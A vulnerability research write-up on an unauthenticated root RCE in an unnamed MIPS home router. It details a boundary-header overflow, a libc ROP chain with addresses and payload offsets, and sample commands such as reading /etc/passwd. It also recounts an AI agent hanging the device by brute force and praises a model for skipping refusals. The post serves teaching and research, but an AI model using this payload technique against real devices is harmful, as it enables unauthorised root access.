---
title: 'Another full home router takeover'
date: 2026-10-14 08:35:00 +0200
categories: ['Vulnerability Research', 'Embedded']
tags: ['embedded', 'firmware', 'mips', 'router', 'rce', 'rop', 'binary-exploitation', 'ai']
description: 'Vulnerability analysis and ROP chain exploitation of an unauthenticated remote code execution flaw in MIPS home routers, along with lessons learned using AI as an offensive research assistant.'
image:
  path: /assets/images/another-router-takeover/cover.jpg
  alt: 'Another full home router takeover'
math: true
---

```shell
$ python3 rop_system.py <host>
[*] target <host>:80  libc=0x2ac56000  mode=system
[*] 25 bytes, HTTP/1.0 200 OK
ROPEXEC

$ python3 rop_system.py <host> --cmd 'ls -la /'
drwxr-xr-x   11         0 sys
drwxr-sr-x    2         3 share
...
```

The commands run as **root** through the router's web interface. No authentication required.

## What is going on here?

I found a set of vulnerabilities in an older line of quite popular MIPS home routers, which I refer to here as **DIAGN** ("Device I Ain't Gonna Name"). This post walks through an unauthenticated remote code execution exploit against its Little Endian hardware variant.

### Why anonymous?

Vendor unresponsiveness on end-of-life hardware.

While these legacy devices are increasingly rare on the open Internet, the educational value of analyzing them remains high. The best responsible disclosure thing that I can offer is a piece of advice: if you still run cheap home routers, replace them. Today.

Older SOHO routers remain ideal targets for studying binary exploitation: they run real-world network services on bare-metal architectures with interesting and peculiar constraints (as we shall see), stripped of the artificial simplicity of CTF challenges.

I teach binary exploitation in my Ethical Hacking course at Sapienza University of Rome, and I wanted a real-world case study for my students rather than another synthetic puzzle.

I also used this project to test AI-assisted vulnerability research. Coming from an x86 background with little prior MIPS experience, I used the model as an interactive architecture tutor to unpack calling conventions, delay slots, and uClibc internals in real time.

The workflow was an exercise in continuous course-correction. Rather than an autonomous exploit generator, I soon realized that I had to scrutinize the agent's reasoning more than I expected. Whenever it went off-track, like trying to execute shellcode on a stack with random location or attempting to brute-force my poor embedded device making it unresponsive (and then interpreting the absence of response with some fantastic hallucinations), I stepped in to steer it back on track.

## The Target and the Lab

DIAGN runs on a **MIPSel 24Kc** processor with a vendor Linux kernel, uClibc, and BusyBox `httpd`. (The same vulnerability pattern exists on the Big Endian hardware revision of this product).

The software architecture follows a common standard for embedded devices:

```text
[HTTP Client] ---> BusyBox httpd  ---> [index.cgi] --->
             ---> (Unix Domain Socket) ---> [Resident Daemon (root)]
```

BusyBox `httpd` dispatches CGI binaries upon request. After parsing HTTP headers, `httpd` connects the CGI process' standard output directly to the client socket.

Any child process spawned by `system()` inherits file descriptor 1 (among others), streaming command output straight back into the HTTP response body.

For privileged operations, like executing OS commands or performing firmware upgrades, the CGIs communicate over Unix Domain Sockets (UDS) with a resident daemon running as root.

Several CGIs share the same class of flaws. This writeup focuses on `index.cgi` (which can be considered the "main" CGI) a non-PIE binary loaded at `0x00400000`.

### The Testbed

I built a virtual testing environment using OpenCode with DeepSeek v4 Flash locally and DeepSeek v4 Pro in the cloud.

The vendor provides firmware images publicly. The AI agent generated an initial QEMU environment on macOS, but getting an accurate replica required manual tuning to match the exact vendor kernel version and system configuration.

For debugging and reverse engineering, I ran `gdb-multiarch` against a server running on the emulated device, and I connected Binary Ninja to OpenCode via MCP. Offloading decompilation queries, struct identification, and variable renaming to the model sped up the analysis considerably.

![Binary Ninja decompilation of read_multipart_form_data](/assets/images/another-router-takeover/binary-ninja-decompilation.png)

The final exploit was scripted using `pwntools`.

## The Vulnerability

The bug sits in `read_multipart_form_data()` inside `index.cgi`. **AI identified it in minutes** and with a fairly unoptimized prompt.

When parsing POST requests with `Content-Type: multipart/form-data`, the function extracts the `boundary=` string and copies it into a fixed stack buffer using an unbounded `strcpy`:

```http
POST /index.cgi HTTP/1.1
Content-Type: multipart/form-data; boundary=AAAA...<payload>...
Content-Length: 1

X
```

Because the boundary parameter has no length validation, **supplying an oversized string writes directly past the buffer and overwrites the saved return address** (`$ra`) on the stack.

A classic.

### Stack Layout and Overwrite Offsets

Thanks to the trusted gdb, (A)I extracted some important information.

`read_multipart_form_data` allocates a `0x1468`-byte stack frame. The destination boundary buffer begins at `$sp + 0xc27`, and the saved `$ra` sits at `$sp + 0x1464`:

```text
Stack frame (0x1468 bytes); sp_frame = $sp after prologue
(Addresses increase downward)

  sp_frame+0x0000   locals
      [...]
  sp_frame+0x0c27   boundary buffer (strcpy dest)  <-- boundary[0]
      [...] 
  sp_frame+0x1440   saved $s0   <-- boundary[0x819]
  sp_frame+0x1444   saved $s1   <-- boundary[0x81d]
  sp_frame+0x1448   saved $s2   <-- boundary[0x821]
  sp_frame+0x144c   saved $s3   <-- boundary[0x825]
  sp_frame+0x1450   saved $s4   <-- boundary[0x829]
  sp_frame+0x1454   saved $s5   <-- boundary[0x82d]
  sp_frame+0x1458   saved $s6   <-- boundary[0x831]
  sp_frame+0x145c   saved $s7   <-- boundary[0x835]
  sp_frame+0x1460   saved $fp   <-- boundary[0x839]
  sp_frame+0x1464   saved $ra   <-- boundary[0x83d]  (target return address)
```

The distance between the buffer and the return address is `0x1464 - 0xc27 = 0x83d` bytes

Byte `0x83d` of the boundary string lands exactly on the saved `$ra`.

When the function finishes, its epilogue executes:

```mips
lw     $ra, 0x1464($sp)      ; ra = boundary[0x83d] (our first gadget)
lw     $fp, 0x1460($sp)      ; restore saved registers...
lw     $s0, 0x1440($sp)
jr     $ra                   ; jump to gadget
addiu  $sp, $sp, 0x1468      ; delay slot: sp advances to sp0
```

After this epilogue (which kicks off our exploit), the stack pointer advances to `sp0 = $sp + 0x1468`. Any boundary offset `O` maps to the new stack layout as `boundary[O] <-> sp0 + (O - 0x841)`.   (i.e, `0x841 = 0x83d +4`).

The exploit payload length is `0x9b9` bytes. The trailing NUL byte written by `strcpy` lands at `boundary[0x9b9]`, terminating our injected command string on the stack (see "Payload Structure" below).

## Architectural Traps and Dead Ends

Before landing on a clean ROP chain, a number of initial exploitation approaches failed due to architecture-specific constraints and AI being unable to pivot autonomously.

### Dead End: Stack Shellcode and Cache Incoherency

The MIPSel 24Kc core has no hardware support for non-executable pages (no NX bit), so the stack is executable. The AI immediately attempted to generate shellcode on the stack.

It failed, for two reasons.

The stack is subject to ASLR. AI noticed this correctly and, given the "low(er)" entropy for randomization due to the 32 bit virtual memory space, it created a bruteforcing script with a NOP sled. 

The script had a "small" logical flaw (which may seem irrelevant from a theoretical perspective but has some practical nuances). It was sweeping through plausible memory locations assuming the address of the stack would be fixed. That was not true: the CGI binary is spawned via fork() **+ exec()** so on each request it receives a freshly randomized address space.

Another flaw occurred because MIPS, unlike x86 architectures, does not enforce hardware cache coherency between the instruction cache (I-cache) and the data cache (D-cache). When `strcpy` writes shellcode to the stack, those bytes sit dirty in the D-cache. When execution jumps to the stack address, the CPU fetches stale instructions from the I-cache, resulting in an immediate crash. My model knew that well, as it explained it to me… but it was hoping to fill the cache to the point it would be flushed. 

But those weren't the worst parts. Brute-forcing embedded devices is a bad idea. They can only respond to a limited number of requests and (given the stack was executable) we ended up causing infinite loops, completely hanging the device.

### The UDS Daemon Pivot

Next, after some old school recon on the device Web UI, I spotted an interesting ping/traceroute feature. These are notorious for allowing command injection, but they are usually gated by authentication...

I directed the agent to build a ROP chain within the non-PIE `index.cgi` binary to invoke the internal traceroute handler. This handler passed commands to the root resident daemon over UDS. 

AI did a great job finding gadgets that skipped the target function's authentication handler. And since the flow also bypassed the sanitization of user-controlled input (i.e., the IP address to perform traceroute to) **we achieved arbitrary command execution as root!** (with the classic `$(command)` and with a simple `;`). 

### The Breakthrough: Incomplete Kernel ASLR

While testing the daemon exploit, process maps revealed a surprise: despite the system reporting ASLR mode 2, shared libraries loaded at the identical virtual address on every execution.

```text
libc.so base: 0x2ac56000 (static across reboots)
```

Using AI, I learned that on older Linux kernels for MIPS, regardless of ASLR being on, mmap bases and shared libraries addresses remained fixed because the randomization logic for those memory areas was still not present. On the other hand, the stack address randomization worked, as it was performed with code shared across different architectures.

This quirk turned what looked like a complex infoleak-dependent target into a deterministic, pure-libc ROP environment.

## MIPS ROP Mechanics

Building a ROP chain in MIPS requires handling conventions that differ fundamentally from x86. 

For the sake of the reader who, like myself before today, has no experience with MIPS, I will quickly introduce some basic low level concepts. This section can be skipped by more experienced readers.

To be able to understand some part of the exploit and be actually helpful steering the converation, I asked AI to give me the same brief crash course.

### Registers (o32 ABI)

| **Register** | **Name** | **Role in Exploit** |
| --- | --- | --- |
| r0 | `$zero` | Always 0 |
| r2 | `$v0` | Return value and syscall number |
| r4 | `$a0` | 1st function argument |
| r5 | `$a1` | 2nd argument |
| r6 | `$a2` | 3rd argument |
| r7 | `$a3` | 4th argument |
| r16–r23 | `$s0`–`$s7` | Callee-saved (restored from stack before return) |
| r25 | `$t9` | Function call target (required to initialize PIC `$gp`) |
| r28 | `$gp` | Global pointer for PIC GOT/data accesses |
| r29 | `$sp` | Stack pointer |
| r31 | `$ra` | Return address |

### The Delay Slot

MIPS executes the instruction (1 instruction) immediately following a jump or branch *before* the transfer of control completes:

```mips
jr    $ra              ; Jump to $ra
addiu $sp, $sp, 0x20   ; Delay slot: executes before jump takes effect
```

This advances `$sp` by `0x20` and transfers execution to `$ra`. In ROP chains, every gadget's delay slot adjusts the stack pointer so the subsequent gadget reads its parameters from the new stack level.

If you are wondering, branch-delay has the same purpose as branch prediction, just way simpler and way less "powerful": it avoids wasting CPU clock cycles when executing a jump or branch instruction.

### The `$t9` and `$gp` Calling Rule

Position-independent shared libraries cannot use hardcoded addresses for global data. Instead, functions reference data relative to `$gp`.

On entry, every PIC function recomputes `$gp` from its own entry address, passed by convention in `$t9`:

```mips
lui   $gp, hi       ; Load upper half of constant
addiu $gp, $gp, lo  ; Add lower half
addu  $gp, $gp, $t9 ; $gp = constant + $t9 (entry address)
```

Because of this contract:

1. You cannot enter a libc function with `jr $ra`. Doing so leaves `$t9` stale, corrupting `$gp` and crashing on the first global access.
2. You must call target functions via `jalr $t9`, with `$t9` holding the target function address.

### x86 vs. MIPS ROP: Key Differences

- **No `ret` instruction**: x86 pops `$rip` from the stack automatically. MIPS requires each gadget to manually reload its return register (`lw $ra, K($sp)`), jump via `jr $ra`, and adjust `$sp` in the delay slot.
- **The `$t9` rule**: x86 allows jumping straight to a function symbol. MIPS requires setting `$t9` to the target address so the function can calculate its global pointer.
- **Active delay slots**: Delay slot instructions execute unconditionally. If a gadget jumps to your target but modifies `$a0` in its delay slot, your arguments are corrupted.

## Crafting the ROP Chain

A sweep of the fixed-address libraries yielded two clean gadgets in `libc.so` (base `0x2ac56000`).

### Gadget Selection

1. **Argument Pointer Setup (`0x24118`)**:

   ```mips
   0x24118  addiu  $a0, $sp, 0x20   ; a0 = sp + 0x20 (points to command string)
   0x2411c  lw     $gp, 0x10($sp)
   0x24120  lw     $ra, 0x18($sp)   ; ra = [sp + 0x18] (loads next gadget)
   0x24124  jr     $ra
   0x24128  addiu  $sp, $sp, 0x20   ; delay slot: sp += 0x20
   ```

2. **Function Dispatch (`0x1e2c0`)**:

   ```mips
   0x1e2c0  lw     $t9, 0x40($sp)   ; t9 = [sp + 0x40] (loads &system)
   0x1e2c4  jalr   $t9              ; system(a0)
   0x1e2c8  nop                     ; delay slot: preserves a0
   0x1e2cc  bnez   $v0, 0x1e2dc     ; if system != 0 -> list-walk loop
   0x1e2d0  lw     $gp, 0x10($sp)
   0x1e2d4  b      0x1e2f8          ; on success -> jump to epilogue
   ...
   0x1e2f8  lw     $ra, 0x28($sp)   ; ra = [sp + 0x28] (loads exit stub)
   0x1e30c  jr     $ra              ; jump to exit stub
   0x1e310  addiu  $sp, $sp, 0x30   ; delay slot
   ```

3. **Clean Exit Stub (`0xb758`)**:

   ```mips
   0x2ac61758  addiu  $v0, $zero, 0xfa1   ; syscall 4001 (sys_exit)
               syscall
   ```

### Control Flow Overview

```text
read_multipart_form_data epilogue
        │  jr ra (ra = 0x2ac7a118), sp = sp0
        ▼
┌────────────────────────────────────────────────────────────┐
│ Gadget 1: 0x2ac7a118                                       │
│   a0 = sp0 + 0x20          -> points to command string     │
│   ra = [sp0 + 0x18]         = 0x2ac742c0 (Gadget 2)        │
│   jr ra ; addiu sp,sp,0x20 -> sp1 = sp0 + 0x20             │
└────────────────────────────────────────────────────────────┘
        │
        ▼
┌────────────────────────────────────────────────────────────┐
│ Gadget 2: 0x2ac742c0                                       │
│   t9 = [sp1 + 0x40] = 0x2aca6b80 (&system)                 │
│   jalr t9          -> runs system(command)                 │
│   returns v0 = exit status                                 │
│   if v0 == 0:                                              │
│     ra = [sp1 + 0x28] = 0x2ac61758 (exit stub)             │
│     jr ra ; addiu sp,sp,0x30                               │
└────────────────────────────────────────────────────────────┘
        │
        ▼
┌────────────────────────────────────────────────────────────┐
│ Exit Stub: 0x2ac61758                                      │
│   syscall sys_exit(a0)                                     │
└────────────────────────────────────────────────────────────┘
```

### Payload Structure

| **Payload Offset** | **Stack Slot** | **Value** | **Description** |
| --- | --- | --- | --- |
| `0x000`–`0x818` | Stack buffer | `A` padding | Fills space up to saved registers |
| `0x819`–`0x824` | Saved `$s0`–`$s2` | `0x41414141` | Padding |
| `0x825` | Saved `$s3` | `0x2acafaf4` | Pointer to ":" string (loop breaker) |
| `0x829`–`0x83c` | Saved `$s4`–`$s7, $fp` | `0x41414141` | Padding |
| `0x83d` | Saved `$ra` | `0x2ac7a118` | Gadget 1 entry |
| `0x851` | `[sp0 + 0x10]` | `0x41414141` | Unused `$gp` reload |
| `0x859` | `[sp0 + 0x18]` | `0x2ac742c0` | Gadget 2 entry |
| `0x861` | `[sp0 + 0x20]` | Command bytes | Shell command string (pointed to by `$a0`) |
| `0x889` | `[sp0 + 0x48]` | `0x2ac61758` | `exit` syscall stub |
| `0x8a1` | `[sp0 + 0x60]` | `0x2aca6b80` | Address of `system()` |
| `0x9b9` | End of payload | `0x00` | NUL byte from `strcpy` (terminates command) |

## Weaponization

Getting the ROP chain working in theory was straightforward, especially with AI doing the heavy-lifting. In practice, making it work reliably on a production device required handling three low-level traps.

### In-Place Destruction by `strtok`

The boundary parameter cannot contain bytes from the forbidden set:

`{ 0x00, 0x20, 0x0A, 0x0D, 0x3A, 0x3B, 0x3D }`  

NUL (`0x00`) cuts `strcpy` short, while CR and LF truncate the HTTP headers. 

The subtler trap comes from `strtok` used to parse the headers. When `index.cgi` parses the header parameters, it splits tokens on `<SPC>:;=`. `strtok` is destructive: it overwrites every delimiter it finds with a `0x00` byte directly in the source buffer. Any space (`<SPC>`), colon, semicolon, or equals sign in the boundary string inserts an unexpected NUL byte, truncating the payload before it reaches the return address via `strcpy`.

### Space Substitution and Command Padding

To pass commands without spaces:

- **Literal tabs (`\t` / `0x09`)**: Tabs count as valid POSIX IFS whitespace without expanding payload size like `${IFS}`.
- **Trailing comment (`<TAB>#`)**: The command string starts at `payload[0x861]`. Because `strcpy` copies up to the final NUL at `0x9b9`, the trailing chain addresses (`&exit`, `&system`) and padding bytes sit directly inside the command string in memory. Appending `<TAB>#` makes the shell treat all trailing bytes as a comment:

```text
payload[0x861]: echo<TAB>ROPEXEC<TAB>2>&1<TAB># AAAA...[&exit][&system]AAAA...
                └─────── command ───────┘└────── comment (ignored) ──────┘
```

- **Output capture (`<TAB>2>&1`)**: Merges standard error into standard output. The separator must be a literal tab so the shell recognizes the redirection token during lexical parsing before variable expansion.

| **Raw Command** | **Encoded Form in Payload** |
| --- | --- |
| `echo ROPEXEC` | `echo<TAB>ROPEXEC<TAB>2>&1<TAB>#` |
| `cat /etc/passwd` | `cat<TAB>/etc/passwd<TAB>2>&1<TAB>#` |
| `ps w | head` | `ps<TAB>w<TAB>|<TAB>head<TAB>2>&1<TAB>#` |

### Loop Safety and the `$s3 = &":"` Fallback

In CTF challenges, an exploit that crashes the target upon exit is usually fine. On a router, a crashed process can hang the web interface or crash the device.

Gadget `0x1e2c0` is the tail of a list-walking routine:

```mips
0x1e2cc  bnez   $v0, 0x1e2dc      ; If system() != 0 -> non-zero branch
...
0x1e2dc  addu   $s0, $s0, $s2
0x1e2e0  addiu  $s1, $s1, -1      ; Loop counter decrement
0x1e2ec  bne    $s1, $v0, 0x1e2c0 ; Loop back to system()
0x1e2f0  move   $a0, $s3          ; Delay slot: next command = $s3
```

Because `system()` returns the shell's exit status, any command that exits non-zero—a typo, a non-existent file, or an omitted BusyBox applet like `id`—takes the `bnez` branch.

If `$s3` were left with padding bytes (`0x41414141`), the loop would invoke `system(0x41414141)`. The child process would fault and return 127, keeping the loop active for roughly $2^{30}$ iterations. This locks the single-core CPU at 100% utilization, freezing the web server until a hard reboot.

By setting saved register `$s3` to point to a static colon string `":"` (`0x2acafaf4`), a failed command triggers a single fallback call to `system(":")`. Because the POSIX null command always returns 0, the next iteration takes the success path and falls through cleanly to the `exit` syscall.

### Exploitation Limits

- **Length**: Usable command length is roughly 33 bytes with stderr redirection (38 bytes getting rid of the stderr redirection).
- **Request body**: The HTTP POST body contains a single byte (`X`). This causes the parser's body-length check to fail immediately, bailing straight out to the epilogue without processing form fields.
  - This required some workaround for the first exploit based on the traceroute execution, where the address and the injected commands were in the POST'd form fields. It was not a problem with the return to libc approach.

## Final Words

To recap the technical pieces: an unauthenticated boundary overflow in `index.cgi` gave control of `$ra`; an ancient kernel's incomplete ASLR left `libc.so` at a fixed address; and two clean gadgets delivered arbitrary command execution. Adding the "loop-safe" `$s3` fallback and tab-delimited comment encoding turned an unstable exploit into a reliable root RCE that streams output directly back over HTTP.

The broader lesson is about using AI in offensive research.

AI today is only useful if you already understand what you are doing. Left unsupervised, the model repeatedly tried to crash the device: it recommended brute-force loops, hallucinated stack shellcode across unsynced D-caches, and generated payloads that would have locked up the CPU. 

Reaching a working exploit required continuous intervention to identify flawed premises and steer the architecture.

That the AI struggled is especially interesting because this is not a hard exploit. By modern standards, the target was remarkably accommodating:

- **No stack canaries**: A direct linear buffer overflow reached the return address without needing an information leak.
- **Static library base**: Incomplete ASLR on Linux 2.6 left `libc.so` at a fixed virtual address on every run.
- **Non-PIE binary**: `index.cgi` loaded at a static address (`0x00400000`).
- **Short ROP chain**: Only two clean gadgets in libc were needed to set up `$a0` and jump to `system()`.
- **Standard `system()` available**: No need to manually build an `execve` syscall frame or assemble pointer arrays.
- **Direct output feedback**: BusyBox `httpd` piped standard output back to the client socket, returning command results immediately without out-of-band exfiltration.

If an AI agent needs this much human guidance to navigate an unfortified binary with fixed library addresses and a two-gadget chain, fully autonomous exploitation against modern targets remains far off.

In fairness, the literature for MIPS exploitation (which ended up in the training material for these models) is probably order of magnitude smaller than what is available for x86 and ARM. Still, it was funny to receive a MIPS exploitation 101 from the same model struggling to apply the same concepts on the field. 

**The outcome reflects what benchmarks like Cybench show in practice: while today's models can solve straightforward targets, they cannot reliably generate non-trivial, multi-stage exploits autonomously. Instead, their true value is as force multipliers for engineers who understand the fundamentals and can steer around hallucinations.** On low-level binary exploitation tasks, unguided autonomous agents routinely fail, rarely breaking past a 10–15% success rate. But when a human operator steps in to provide directional milestones, debug silent crashes, and correct architectural false starts, success rates triple. Low-level memory corruption provides no conversational feedback... a bad pointer or an uninitialized register just hangs or crashes the process and AI filled that "silence" with hallucinations. 

The choice of models mattered. I relied on **DeepSeek v4 Pro** in the cloud because it is uncensored from a cybersecurity perspective: it engages directly with exploit primitives and disassembly without the reflex refusals that cripple other frontier models, while delivering reasoning close to the state of the art. At the same time, I ran **DeepSeek v4 Flash** locally to benchmark on-premise inference for vulnerability work. On high-end hardware, local models have become surprisingly capable: they are fast enough for rapid decompilation queries in Binary Ninja and handle heavy lifting without sending proprietary firmware off-box.

## Proof of Discovery Commitment

To preserve proof of prior discovery while keeping target details private, the device model, firmware version, binary hashes, researcher email, and exploit script are committed below via a salted SHA-256 hash.

- **Timestamp**: `2026-10-14T08:35:00+02:00`
- **SHA-256 commitment**: `7b16b8a1a0208e23179cb8c61c8bc38fd573fba232bf802ee7977d8c4f516c3d`

If this vulnerability is disclosed or claimed elsewhere, the plaintext statement and random nonce will be published to verify priority.
